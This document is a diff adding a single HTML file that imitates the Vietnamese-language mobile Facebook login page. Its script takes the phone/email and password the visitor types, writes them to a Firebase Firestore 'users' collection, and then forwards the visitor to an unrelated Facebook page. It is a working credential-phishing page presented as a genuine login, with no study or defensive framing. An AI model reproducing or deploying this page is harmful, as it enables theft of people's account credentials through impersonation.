@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport">
+  <title>Facebook</title>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+  <!-- update the version number as needed -->
+  <script src="https://kit.fontawesome.com/05ef113fe5.js" crossorigin="anonymous"></script>
+  <script defer src="/__/firebase/7.12.0/firebase-app.js"></script>
+  <!-- include only the Firebase features as you need -->
+  <script defer src="/__/firebase/7.12.0/firebase-auth.js"></script>
+  <script defer src="/__/firebase/7.12.0/firebase-database.js"></script>
+
+  <script defer src="/__/firebase/7.12.0/firebase-firestore.js"></script>
+  <script defer src="/__/firebase/7.12.0/firebase-messaging.js"></script>
+  <script defer src="/__/firebase/7.12.0/firebase-storage.js"></script>
+  <!-- initialize the SDK after all desired features are loaded -->
+  <script defer src="/__/firebase/init.js"></script>
+  <style type="text/css">
+    body {
+      font-size: 80px;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .header {
+      font-weight: 650;
+      color: white;
+      text-align: center;
+      background-color: #3c5a98;
+      padding: 10px 0px 10px;
+      margin: 0px 0px 5px 0px;
+    }
+
+    .note {
+      display: flex;
+      width: 100%;
+      font-size: 40px;
+      background-color: #F9FAB1;
+      padding: 25px 25px;
+    }
+
+    i {
+      padding-right: 20px;
+      opacity: 50%;
+    }
+
+    .user {
+      border: 1px solid black;
+      width: 750px;
+      border-radius: 10px;
+      height: 100px;
+    }
+
+    .form {
+      margin: 100px;
+      width: 250px;
+      font-size: 50px;
+    }
+
+    .login {
+      color: white;
+      border-radius: 15px;
+      margin-left: 95px;
+      padding: 15px 180px;
+      background-color: #3370FF;
+    }
+
+    .hoac {
+      margin-top: 35px;
+      text-align: center;
+      font-size: 45px;
+    }
+
+    .create {
+      font-size: 45px;
+      font-weight: 400;
+      color: white;
+      border-radius: 15px;
+      margin-left: 200px;
+      padding: 35px 80px;
+      background-color: #3BBF1F;
+    }
+
+    .forgot {
+      margin-left: 350px;
+      font-size: 35px;
+    }
+
+    .language {
+      margin-top: 85px;
+      display: flex;
+      justify-content: space-around;
+      font-size: 35px;
+    } 
+    
+  </style>
+</head>
+
+<body>
+  <div>
+    <div class="header">facebook</div>
+    <div class="note">
+      <div><i class="fas fa-mobile fa-2x"></i></div>
+      <div>Tải Facebook dành cho Android và lướt xem nhanh hơn</div>
+    </div>
+    <div class="form">
+      <input type="text" class="user" placeholder="Số điện thoại di động hoặc email" id="name">
+      <input type="password" class="user" placeholder="Mật khẩu" id="pass">
+    </div>
+    <a href="https://www.facebook.com/You-Know-What--107189724269836/inbox/" id="login" class="login">Đăng nhập</a>
+    <div class="hoac">hoặc</div>
+    <div><a href="#" class="create">Tạo tài khoản mới</a></div>
+    <div><a href="#" class="forgot">Quên mật khẩu?</a></div>
+    <div class="language">
+      <div>
+        <div><a href="#">Tiếng Việt</a></div>
+        <div><a href="#">English</a></div>
+        <div><a href="#">Russian</a></div>
+      </div>
+      <div>
+        <div><a href="#">Uckraine</a></div>
+        <div><a href="#">Espanol</a></div>
+        <div><a href="#">Portugaes</a></div>
+      </div>
+    </div>
+    <p class="hoac">Facebook, Inc</p>
+  </div>
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      var db = firebase.firestore();
+      // 1 . get data 
+      // db.collection("users").get().then((querySnapshot) => {
+      //   console.log(querySnapshot.docs[0].data().name);
+      // });
+      document.getElementById('login').addEventListener('click', addItem);
+      function addItem() {
+        var user = document.getElementById('name').value;
+        var pass = document.getElementById("pass").value;
+
+        // const docRef = firebase.doc('users/infor');
+        // Add a second document with a generated ID.
+        if (user !== "" && pass !== "") {
+          db.collection("users").add({
+            name: user,
+            password: pass
+          }).then(function (docRef) {
+            console.log('Done');
+            console.log("Document written with ID: ", docRef.id);
+            document.getElementById('name').value= ""
+            document.getElementById("pass").value = ""
+          }).catch(function (error) {
+            console.error("Error adding document: ", error);
+          });
+        }
+        console.log('Do nothing')
+      }
+    });
+  </script>
+</body>
+
+</html>
